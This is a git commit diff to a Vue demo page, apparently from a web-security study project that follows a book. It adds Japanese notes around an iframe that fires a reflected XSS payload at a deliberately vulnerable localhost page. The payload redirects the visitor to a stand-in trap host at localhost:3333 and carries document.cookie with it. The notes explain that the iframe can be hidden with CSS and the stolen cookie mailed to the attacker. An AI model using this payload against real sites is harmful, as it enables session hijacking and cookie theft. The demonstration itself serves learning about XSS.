e4bed831fd215f6ebe5d34200c0988554fc55c5c
watanata <watanabetatsuya@lifull.com>
2019-09-05 16:18:27 +0900

    add description for xss.vue

--- pages/xss.vue
+++ pages/xss.vue
@@ -4,9 +4,21 @@
       本の91ページのやつ</br>
       以下のiframeはCSSで隠せる
     </div>
-    <iframe width=320 height=100 src="http://localhost:3000/show?name=<script>window.location='http://localhost:3333/hoge?sid='%2Bdocument.cookie;</script>"></iframe>
-    <iframe width=320 height=100 src="http://localhost:3000/show?name=watanata"></iframe>
+
+    </br>
+    <div>
+      <p>XSS脆弱性のある下記のページ(localhost:3000/show)にパラメータとして</br>
+      <strong>?name=&lt;script&gt;window.location='http://localhost:3333/hoge?sid='%2Bdocument.cookie;&lt;/script&gt;</strong></br>
+      をリクエストしている。そのためこのページにアクセスした人はhttp://localhost:3333/hoge?sid=に強制的にリダイレクトさせられ、クッキーの値をクエリとしてリクエストさせられる。</br>
+      localhost:3333/hogeも罠サイトでありパラメータの値を攻撃者にメール送信するなどすればアクセスした人のクッキーの値を盗むことができる</p>
+      <iframe width=320 height=100 src="http://localhost:3000/show?name=<script>window.location='http://localhost:3333/hoge?sid='%2Bdocument.cookie;</script>"></iframe>
+    </div>
+
+    </br>
+    <div>
+      <p>単純に?name=watanataでアクセスすると下記のようになる</p>
+      <iframe width=320 height=100 src="http://localhost:3000/show?name=watanata"></iframe>
+    </div>
   </div>
 
 </template>
-
